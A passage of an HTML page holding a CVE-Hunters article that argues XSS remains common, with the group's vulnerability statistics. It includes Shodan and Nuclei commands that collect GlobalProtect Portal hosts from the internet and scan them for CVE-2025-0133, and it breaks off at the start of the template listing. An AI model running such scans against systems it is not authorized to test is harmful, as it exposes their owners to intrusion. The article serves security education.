@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Based on real-world findings from CVE-Hunters, this article shows why this classic vulnerability still deserves serious attention in today’s web applications.">
+<title>XSS is not Dead - Hacktiba Pulse 07</title>
+
+<link rel='canonical' href='https://www.cvehunters.com/articles/xss-nao-esta-morto/'>
+
+<link rel="stylesheet" href="/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css"><meta property='og:title' content="XSS is not Dead - Hacktiba Pulse 07">
+<meta property='og:description' content="Based on real-world findings from CVE-Hunters, this article shows why this classic vulnerability still deserves serious attention in today’s web applications.">
+<meta property='og:url' content='https://www.cvehunters.com/articles/xss-nao-esta-morto/'>
+<meta property='og:site_name' content='CVE-Hunters'>
+<meta property='og:type' content='article'><meta property='article:section' content='Articles' /><meta property='article:tag' content='CVE-Hunters' /><meta property='article:tag' content='XSS' /><meta property='article:tag' content='Vulnerability Research' /><meta property='article:tag' content='Web Application Security' /><meta property='article:tag' content='Responsible Disclosure' /><meta property='article:tag' content='Open Source Vulnerabilities' /><meta property='article:tag' content='Security Tools for Pentesters' /><meta property='article:tag' content='Bug Bounty Tools' /><meta property='article:tag' content='Ethical Hacking' /><meta property='article:tag' content='XSS Detection' /><meta property='article:published_time' content='2025-07-07T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-07-07T00:00:00&#43;00:00'/><meta property='og:image' content='https://www.cvehunters.com/articles/xss-nao-esta-morto/xss-is-not-dead.png' />
+<meta name="twitter:title" content="XSS is not Dead - Hacktiba Pulse 07">
+<meta name="twitter:description" content="Based on real-world findings from CVE-Hunters, this article shows why this classic vulnerability still deserves serious attention in today’s web applications."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://www.cvehunters.com/articles/xss-nao-esta-morto/xss-is-not-dead.png' /><link rel="alternate" type="application/rss&#43;xml" href="https://www.cvehunters.com/articles/xss-nao-esta-morto/index.xml">
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_b690a75912753cd9.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🏹</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">CVE-Hunters</a></h1>
+            <h2 class="site-description">Vulnerability Research Group.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://discord.gg/3GJvV6xPeg'
+                        target="_blank"
+                        title="Discord"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 1 0 2 0a1 1 0 0 0 -2 0" /><path d="M14 12a1 1 0 1 0 2 0a1 1 0 0 0 -2 0" /><path d="M15.5 17c0 1 1.5 3 2 3c1.5 0 2.833 -1.667 3.5 -3c.667 -1.667 .5 -5.833 -1.5 -11.5c-1.457 -1.015 -3 -1.34 -4.5 -1.5l-.972 1.923a11.913 11.913 0 0 0 -4.053 0l-.975 -1.923c-1.5 .16 -3.043 .485 -4.5 1.5c-2 5.667 -2.167 9.833 -1.5 11.5c.667 1.333 2 3 3.5 3c.5 0 2 -2 2 -3" /><path d="M7 16.5c3.5 1 6.5 1 10 0" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:contact@cvehunters.com'
+                        target="_blank"
+                        title="E-mail"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sec-Dojo-Cyber-House/cve-hunters'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/company/cve-hunters/'
+                        target="_blank"
+                        title="LinkedIn"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-linkedin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 11v5" /><path d="M8 8v.01" /><path d="M12 16v-5" /><path d="M16 16v-3a2 2 0 1 0 -4 0" /><path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.youtube.com/@CVEHunters'
+                        target="_blank"
+                        title="YouTube"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-youtube"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M2 8a4 4 0 0 1 4 -4h12a4 4 0 0 1 4 4v8a4 4 0 0 1 -4 4h-12a4 4 0 0 1 -4 -4v-8z" /><path d="M10 9l5 3l-5 3z" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li  class='current' >
+            <a href='/articles/' >
+                
+                
+                
+                    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-article"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 4m0 2a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2z" /><path d="M7 8h10" /><path d="M7 12h10" /><path d="M7 16h10" /></svg>
+                
+                <span>Articles</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/team/' >
+                
+                
+                
+                    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-users"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 7m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0" /><path d="M3 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" /><path d="M16 3.13a4 4 0 0 1 0 7.75" /><path d="M21 21v-2a4 4 0 0 0 -3 -3.85" /></svg>
+                
+                <span>Team</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/stats/' >
+                
+                
+                
+                    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-chart-bar"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 13a1 1 0 0 1 1 -1h4a1 1 0 0 1 1 1v6a1 1 0 0 1 -1 1h-4a1 1 0 0 1 -1 -1z" /><path d="M15 9a1 1 0 0 1 1 -1h4a1 1 0 0 1 1 1v10a1 1 0 0 1 -1 1h-4a1 1 0 0 1 -1 -1z" /><path d="M9 5a1 1 0 0 1 1 -1h4a1 1 0 0 1 1 1v14a1 1 0 0 1 -1 1h-4a1 1 0 0 1 -1 -1z" /><path d="M4 20h14" /></svg>
+                
+                <span>Stats</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/support/' >
+                
+                
+                
+                    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-heart-handshake"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M19.5 12.572l-7.5 7.428l-7.5 -7.428a5 5 0 1 1 7.5 -6.566a5 5 0 1 1 7.5 6.572" /><path d="M12 6l-3.293 3.293a1 1 0 0 0 0 1.414l.543 .543c.69 .69 1.81 .69 2.5 0l1 -1a3.182 3.182 0 0 1 4.5 0l2.25 2.25" /><path d="M12.5 15.5l2 2" /><path d="M15 13l2 2" /></svg>
+                
+                <span>Support</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-info-octagon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12.802 2.165l5.575 2.389c.48 .206 .863 .589 1.07 1.07l2.388 5.574c.22 .512 .22 1.092 0 1.604l-2.389 5.575c-.206 .48 -.589 .863 -1.07 1.07l-5.574 2.388c-.512 .22 -1.092 .22 -1.604 0l-5.575 -2.389a2.036 2.036 0 0 1 -1.07 -1.07l-2.388 -5.574a2.036 2.036 0 0 1 0 -1.604l2.389 -5.575c.206 -.48 .589 -.863 1.07 -1.07l5.574 -2.388a2.036 2.036 0 0 1 1.604 0z" /><path d="M12 9h.01" /><path d="M11 12h1v4h1" /></svg>
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://www.cvehunters.com/" selected>English</option>
+                                
+                                    <option value="https://www.cvehunters.com/pt/" >Português</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#introduction-xss-still">Introduction: &ldquo;XSS? Still?&rdquo;</a></li>
+    <li><a href="#cve-hunters-vs-xss">CVE-Hunters vs XSS</a></li>
+    <li><a href="#practical-experience"><strong>Practical experience</strong></a></li>
+    <li><a href="#more-numbers"><strong>More numbers</strong></a></li>
+    <li><a href="#what-can-you-do-with-an-xss-besides-alert1"><strong>What can you do with an XSS besides alert(1)?</strong></a></li>
+    <li><a href="#conclusion"><strong>Conclusion</strong></a></li>
+    <li><a href="#written-by">Written by</a></li>
+    <li><a href="#contributor">Contributor</a></li>
+    <li><a href="#partnership">Partnership</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/articles/xss-nao-esta-morto/">
+                <img src="/articles/xss-nao-esta-morto/xss-is-not-dead_hu_4ec8edd4e845119c.png"
+                        srcset="/articles/xss-nao-esta-morto/xss-is-not-dead_hu_4ec8edd4e845119c.png 800w, /articles/xss-nao-esta-morto/xss-is-not-dead_hu_eb2122ac4b4c10e1.png 1600w"
+                        width="800" 
+                        height="400" 
+                        loading="lazy"
+                        alt="Featured image of post XSS is not Dead - Hacktiba Pulse 07" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/vulnerability-research/" >
+                Vulnerability Research
+            </a>
+        
+            <a href="/categories/open-source-security/" >
+                Open Source Security
+            </a>
+        
+            <a href="/categories/web-application-security/" >
+                Web Application Security
+            </a>
+        
+            <a href="/categories/pentest-tools/" >
+                Pentest Tools
+            </a>
+        
+            <a href="/categories/ethical-hacking-projects/" >
+                Ethical Hacking Projects
+            </a>
+        
+            <a href="/categories/cve-disclosure/" >
+                CVE Disclosure
+            </a>
+        
+            <a href="/categories/cybersecurity-education/" >
+                Cybersecurity Education
+            </a>
+        
+            <a href="/categories/case-studies/" >
+                Case Studies
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/articles/xss-nao-esta-morto/">XSS is not Dead - Hacktiba Pulse 07</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Based on real-world findings from CVE-Hunters, this article shows why this classic vulnerability still deserves serious attention in today’s web applications.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2025-07-07T00:00:00Z'>Jul 07, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    8 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="https://www.cvehunters.com/pt/articles/xss-nao-esta-morto/" class="link">Português</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="introduction-xss-still">Introduction: &ldquo;XSS? Still?&rdquo;
+</h2><p style="text-align: justify;">In the middle of 2025, are we still talking about XSS? Yes, we still are. Even with the use of modern frameworks, intelligent WAFs and a plethora of articles explaining how to mitigate this threat, Cross-Site Scripting (XSS) is still present, sneaky, persistent and often overlooked.</p>
+<p style="text-align: justify;">XSS is one of the first vulnerabilities covered in introductory courses on offensive security and web application penetration testing. With a simple payload, instructors demonstrate how trivial this flaw is to exploit, highlighting the danger and ease of its exploitation.</p>
+<p style="text-align: justify;">XSS is one of the first vulnerabilities covered in introductory courses on offensive security and web application penetration testing. With a simple payload, instructors demonstrate how trivial this flaw is to exploit, highlighting the danger and ease of its exploitation.</p>
+<p style="text-align: justify;">But what is XSS anyway? According to <b><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP</a></b>, Cross-Site Scripting attacks are a type of injection in which malicious scripts are inserted into vulnerable websites. These attacks occur when an attacker uses a web application to send malicious code, usually scripts executed in the browser, to another user. The flaws that make these attacks possible are quite common and arise whenever a web application incorporates user input into the generated output without carrying out appropriate validation or coding.</p>
+<p style="text-align: justify;">Also according to <b><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP</a></b>, the victim's browser has no mechanism for distinguishing legitimate scripts from malicious ones. Thus, when it receives and executes the code, it trusts that it came from a secure source. As a result, the attacker can access cookies, session tokens and other sensitive information stored by the browser, as well as rewriting the content of the page or redirecting the user to malicious sites disguised as legitimate ones.</p>
+<p><img src="/articles/xss-nao-esta-morto/image.png"
+	width="462"
+	height="160"
+	srcset="/articles/xss-nao-esta-morto/image_hu_e521a21402f0fae0.png 480w, /articles/xss-nao-esta-morto/image_hu_452c6b4617d6a6e9.png 1024w"
+	loading="lazy"
+	
+		alt="Simple example of an XSS payload to execute a message."
+	
+	
+		class="gallery-image" 
+		data-flex-grow="288"
+		data-flex-basis="693px"
+	
+></p>
+<h2 id="cve-hunters-vs-xss">CVE-Hunters vs XSS
+</h2><p style="text-align: justify;">The <b><a href="https://github.com/Sec-Dojo-Cyber-House/cve-hunters" target="_blank">CVE-Hunters</a></b> group was created in November 2024 as a joint initiative between students and a teacher, with a clear objective: to identify vulnerabilities (CVEs) in open source projects. The proposal was to give students practical experience in searching for flaws in real environments, going beyond controlled labs or Capture The Flag (CTF) challenges.</p>
+<p style="text-align: justify;">Since then, the group has analyzed a wide range of projects, from small community systems to applications widely used in the public and educational sectors. Along the way, one pattern has stood out: the frequency with which <b>Cross-Site Scripting (XSS)</b> vulnerabilities have been found.</p>
+<p style="text-align: justify;">This recurrence raises an important question: have developers stopped treating XSS seriously enough? Despite being a widely documented and known flaw for years, it still appears frequently. Even in organizations with mature development processes, XSS vulnerabilities continue to appear due to the complexity of input and output flows, the use of legacy libraries or the lack of contextualized testing.</p>
+<p style="text-align: justify;">Currently, the group has <b>135 reported vulnerabilities</b>, <b>53 of which have already been officially registered as CVEs</b>. Of the total number of vulnerabilities discovered, <b>104 are of the XSS type</b>, which represents a significant and worrying proportion.</p>
+<p><img src="/articles/xss-nao-esta-morto/1.png"
+	width="1024"
+	height="768"
+	srcset="/articles/xss-nao-esta-morto/1_hu_9cbac253be823803.png 480w, /articles/xss-nao-esta-morto/1_hu_e09f18163500396d.png 1024w"
+	loading="lazy"
+	
+		alt="Vulnerabilities types Found by CVE-Hunters"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="133"
+		data-flex-basis="320px"
+	
+></p>
+<p style="text-align: justify;">62 occurrences of the stored type and 42 of the reflected type were identified, revealing a relatively even distribution.</p>
+<p><img src="/articles/xss-nao-esta-morto/2.png"
+	width="1024"
+	height="768"
+	srcset="/articles/xss-nao-esta-morto/2_hu_9d85e2af39ca47f0.png 480w, /articles/xss-nao-esta-morto/2_hu_b7c8b0a71c9c5136.png 1024w"
+	loading="lazy"
+	
+		alt="Amount of Stored vs Reflected XSS"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="133"
+		data-flex-basis="320px"
+	
+></p>
+<p style="text-align: justify;">This statistics alone reinforces the idea that XSS is still a real problem, often overlooked during development, and that it continues to deserve attention, both from the technical community and from developers responsible for applications in production.</p>
+<h2 id="practical-experience"><strong>Practical experience</strong>
+</h2><p style="text-align: justify;">You may now be thinking: "OK, the <b><a href="https://github.com/Sec-Dojo-Cyber-House/cve-hunters" target="_blank">CVE-Hunters</a></b> group has found a lot of XSS in open source projects, but who's to say that large companies are also vulnerable?"</p>
+<p style="text-align: justify;">Let's do a quick experiment, with one of the most recent XSS disclosed during the writing of this article: <b><a href="https://security.paloaltonetworks.com/CVE-2025-0133" target="_blank">CVE-2025-0133</a>.</b> An XSS reflected in the GlobalProtect gateway and portal products, features of Palo Alto Networks' PAN-OS, published on May 14, 2025.</p>
+<p style="text-align: justify;">With a simple query on Shodan, we can check the estimated amount of use of this product in the world.</p>
+<p><img src="/articles/xss-nao-esta-morto/image-1.png"
+	width="2502"
+	height="572"
+	srcset="/articles/xss-nao-esta-morto/image-1_hu_e49695ca67986346.png 480w, /articles/xss-nao-esta-morto/image-1_hu_9a3164d2b1826f8.png 1024w"
+	loading="lazy"
+	
+		alt="Shodan’s search for pages with Global Protect"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="437"
+		data-flex-basis="1049px"
+	
+></p>
+<p style="text-align: justify;">However, this doesn't mean that everyone is vulnerable. Let's go through the experiment for this article.</p>
+<p style="text-align: justify;">First, we extract some results from Shodan, a small sample of the total amount:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shodan search --fields hostnames <span class="s1">&#39;http.title:&#34;GlobalProtect Portal&#34; port:443&#39;</span> <span class="p">|</span> grep -v <span class="s1">&#39;^$&#39;</span> &gt; globalprotect-hostnames.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/articles/xss-nao-esta-morto/image-2.png"
+	width="1715"
+	height="877"
+	srcset="/articles/xss-nao-esta-morto/image-2_hu_f5d23ac8a0a8c2d7.png 480w, /articles/xss-nao-esta-morto/image-2_hu_80e917587581191.png 1024w"
+	loading="lazy"
+	
+		alt="Shodan CLI used to export pages with Global Protect"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="469px"
+	
+></p>
+<p style="text-align: justify;">After that, we can use <b><code>Nuclei</code></b> to test for this vulnerability and automate the test:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nuclei -l globalprotect-hostnames.txt -t CVE-2025-0133.yaml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/articles/xss-nao-esta-morto/image-3.png"
+	width="1629"
+	height="867"
+	srcset="/articles/xss-nao-esta-morto/image-3_hu_a4ac1f5eae1ec9f0.png 480w, /articles/xss-nao-esta-morto/image-3_hu_a7cb5b9475b5bb68.png 1024w"
+	loading="lazy"
+	
+		alt="Nuclei’s results for CVE-2025-0133 template"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="450px"
+	
+></p>
+<p style="text-align: justify;">Template used for scanning: <b><a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-0133.yaml" target="_blank">CVE-2025-0133</a></b>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
